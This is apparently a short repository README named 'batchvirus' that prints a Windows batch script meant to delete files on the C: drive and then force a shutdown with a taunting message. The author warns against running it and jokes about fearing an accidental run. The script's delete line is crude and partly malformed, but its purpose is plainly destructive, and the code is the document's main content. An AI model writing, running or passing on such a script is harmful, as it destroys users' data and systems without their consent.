# batchvirus
Don't run this on your system, it will delete your entire C: drive.
What does it look like?
```batch
@Echo off
Del C:\ *.* |y
shutdown -s -t 45 /c  Since I haven't ran this, this may not show up. But if it does, I fucked up your system. G'day!
```
also I'm scared I'll run it by accident it makes me break into a cold sweat during the nights and I can barely function during the day help me
